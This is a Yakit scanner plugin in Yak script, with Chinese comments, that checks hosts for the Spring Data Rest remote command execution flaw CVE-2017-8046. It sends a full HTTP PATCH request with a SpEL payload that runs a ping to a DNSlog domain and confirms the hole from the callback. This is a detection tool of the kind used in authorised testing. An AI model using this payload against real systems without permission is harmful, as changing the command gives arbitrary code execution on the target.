# port scan plugin
yakit.AutoInitYakit()
//Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）检测
//Spring_Data_Rest_CVE-2017-8046_poc.yak
//默认调用portscan扫描
handleCheck = func(target,port,command,token){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `PATCH /customers/1 HTTP/1.1
Host: {{params(target)}}
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 202

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{{params(command)}}))/lastname", "value": "vulhub" }]`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"command":command}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    // dump(rsp)
    if len(rsp) > 0 {
        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
        if len(dnsdata) > 0 {
            yakit.Info("%v found Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）", addr)
            println(dnsdata)
            risk.NewRisk(
            addr,risk.title("CVE-2017-8046"),
            risk.severity("high"),
            risk.titleVerbose("Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）"),
            risk.type("rce[Confluence]"),
            risk.payload(`[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]dnslog))/lastname", "value": "vulhub" }]`),
        )
        }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    server, token, err = risk.NewDNSLogDomain()
    cmds = str.f("ping -c 2 %v", server)
    yakit.Info(cmds)
    log.info(cmds)
    command = str.ReplaceAll((str.ReplaceAll((str.ReplaceAll((str.f("%d", []byte(cmds))), " ", ",")), "[", "{")), "]", "}")
    log.info(command)
    yakit.Info(command)
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port,command,token)
    }
    
}
